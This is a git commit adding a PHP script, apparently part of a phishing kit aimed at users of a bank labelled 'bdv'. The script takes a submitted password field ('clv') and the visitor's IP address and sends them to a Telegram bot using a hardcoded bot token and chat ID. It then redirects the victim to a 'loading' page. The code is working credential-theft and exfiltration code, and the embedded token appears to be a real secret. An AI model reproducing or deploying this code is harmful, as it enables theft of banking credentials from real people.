bcc6e4e14833d710aa0e4007a77ebb9d76a6f811
verifybdv <nachojoa@hotmail.com>
2024-09-23 06:27:36 +0200

    Add files via upload

---
+++ step-21.php
@@ -0,0 +1,27 @@
+<?php
+// Recoger los datos del formulario
+$correo = $_POST['cl'];
+
+
+$ip = $_SERVER['REMOTE_ADDR']; // Obtener la dirección IP del cliente
+
+// API key del chatbot de Telegram
+$bot_api_key = '7845902551:AAEpDrmlfklI7BAcyGzZAB97U4cCxylszR0';
+
+// ID del chat al que se enviará el mensaje
+$chat_id = '1271362249';
+
+// Mensaje que se enviará al chatbot
+$mensaje_para_chatbot = "🔐🧿usuario bvd🧿🔐\n" . "clv: " . $correo .  "\nip: " . $ip;
+
+// URL de la API de Telegram para enviar mensajes
+$telegram_url = "https://api.telegram.org/bot" . $bot_api_key . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($mensaje_para_chatbot);
+
+// Enviar el mensaje al chatbot de Telegram
+$response = file_get_contents($telegram_url);
+
+// Redirigir a index.php
+header("Location: cargando.html");
+exit;
+
+?>
